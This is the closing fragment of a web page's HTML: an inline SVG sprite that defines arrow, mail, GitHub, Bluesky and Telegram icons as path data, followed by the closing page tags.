  <symbol id="icon-right" viewBox="0 0 1024 1024"><path d="M765.7 486.8L314.9 134.7c-5.3-4.1-12.9-0.4-12.9 6.3v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1c16.4-12.8 16.4-37.6 0-50.4z"></path></symbol>
  <symbol id="icon-left" viewBox="0 0 1024 1024"><path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8c-16.4 12.8-16.4 37.5 0 50.3l450.8 352.1c5.3 4.1 12.9 0.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path></symbol>
  <symbol id="icon-mail-fill" viewBox="0 0 1024 1024"><path d="M928 160H96c-17.7 0-32 14.3-32 32v640c0 17.7 14.3 32 32 32h832c17.7 0 32-14.3 32-32V192c0-17.7-14.3-32-32-32z m-80.8 108.9L531.7 514.4c-7.8 6.1-18.7 6.1-26.5 0L189.6 268.9c-1.8-1.4-2.8-3.5-2.8-5.7 0-4 3.2-7.2 7.2-7.2h648.8c2.2 0 4.3 1 5.7 2.8 2.4 3.1 1.9 7.6-1.3 10.1z"></path></symbol>
  <symbol id="icon-github-fill" viewBox="0 0 1024 1024"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9 23.5 23.2 38.1 55.4 38.1 91v112.5c0.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></symbol>
  <symbol id="icon-bluesky" viewBox="0 0 1024 1024"><path d="M512 485.888c-38.656-75.136-143.872-215.210667-241.706667-284.245333-93.738667-66.133333-129.450667-54.741333-152.874666-44.074667C90.282667 169.728 85.333333 211.413333 85.333333 235.861333c0 24.533333 13.44 200.917333 22.186667 230.4 29.013333 97.28 132.010667 130.133333 226.986667 119.594667-139.093333 20.608-262.698667 71.253333-100.693334 251.648 178.261333 184.533333 244.309333-39.552 278.186667-153.173333 33.877333 113.621333 72.874667 329.642667 274.944 153.173333 151.722667-153.173333 41.685333-231.04-97.408-251.648 94.933333 10.538667 197.973333-22.314667 226.944-119.594667 8.746667-29.44 22.186667-205.866667 22.186667-230.357333 0-24.533333-4.949333-66.133333-32.085334-78.421333-23.424-10.581333-59.136-22.058667-152.874666 44.074666-97.834667 69.162667-203.093333 209.237333-241.706667 284.330667z" p-id="2372"></path></symbol>
  <symbol id="icon-telegram" viewBox="0 0 1024 1024"><path d="M512 938.666667C276.352 938.666667 85.333333 747.648 85.333333 512S276.352 85.333333 512 85.333333s426.666667 191.018667 426.666667 426.666667-191.018667 426.666667-426.666667 426.666667z m-132.693333-376.746667l0.554666-0.298667 37.12 122.453334c4.778667 13.269333 11.349333 15.658667 19.328 14.549333 8.021333-1.066667 12.245333-5.376 17.493334-10.410667l50.688-48.981333 108.8 80.554667c19.882667 10.965333 34.176 5.290667 39.125333-18.432l70.698667-333.738667c7.808-31.061333-5.845333-43.52-29.952-33.621333l-415.274667 160.426666c-28.330667 11.349333-28.16 27.221333-5.12 34.261334l106.538667 33.28z" p-id="5206"></path></symbol>
</svg></body></html>